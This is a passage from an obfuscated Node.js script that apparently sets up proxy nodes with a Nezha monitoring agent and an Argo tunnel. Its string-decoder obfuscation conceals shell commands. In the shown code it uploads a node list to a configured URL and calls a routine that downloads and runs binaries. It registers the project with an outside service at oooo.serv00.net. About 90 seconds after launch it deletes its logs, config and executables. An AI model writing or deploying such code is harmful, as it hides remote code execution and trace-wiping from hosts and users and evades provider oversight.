_0x21ecf0=JSON[_0x11f78d(0x19f)]({'nodes':_0x104cb7});try{const _0x2679f9=await axios['post'](UPLOAD_URL+_0x11f78d(0x192),_0x21ecf0,{'headers':{'Content-Type':_0x11f78d(0x1cc)}});return _0x2679f9&&_0x2679f9[_0x11f78d(0x17b)]===0xc8?(console['log'](_0x11f78d(0x174)),_0x2679f9):null;}catch(_0xd82bb6){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x40e7bb=_0x2f7d,_0x53b6a7=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x53b6a7['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x53b6a7[_0x40e7bb(0x226)](phpPath);process[_0x40e7bb(0x1a6)]===_0x40e7bb(0x198)?exec(_0x40e7bb(0x20a)+_0x53b6a7[_0x40e7bb(0x1a3)]('\x20')+_0x40e7bb(0x1d7),_0x2d9cbf=>{const _0x945742=_0x40e7bb;console[_0x945742(0x208)](),console[_0x945742(0x1b2)]('App\x20is\x20running'),console[_0x945742(0x1b2)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x40e7bb(0x205)+_0x53b6a7[_0x40e7bb(0x1a3)]('\x20')+_0x40e7bb(0x17a),_0x245ae8=>{const _0xe7fb67=_0x40e7bb;console[_0xe7fb67(0x208)](),console['log'](_0xe7fb67(0x19c)),console[_0xe7fb67(0x1b2)](_0xe7fb67(0x216));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x28d6e2=_0x5a2192;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x28d6e2(0x181));return;}try{const _0x17a7c3=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console['log'](_0x28d6e2(0x22c)),_0x17a7c3;}catch(_0x50abc2){return console['error'](_0x28d6e2(0x1a0)+_0x50abc2[_0x28d6e2(0x19e)]),null;}}async function startserver(){const _0x59d7a2=_0x5a2192;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x597cf9){console[_0x59d7a2(0x1b4)](_0x59d7a2(0x1e6),_0x597cf9);}}startserver()[_0x5a2192(0x1e9)](_0x32e2a0=>{const _0x2b6ad3=_0x5a2192;console[_0x2b6ad3(0x1b4)]('Unhandled\x20error\x20in\x20startserver:',_0x32e2a0);}),app['listen'](PORT,()=>console['log'](_0x5a2192(0x17f)+PORT+'!'));
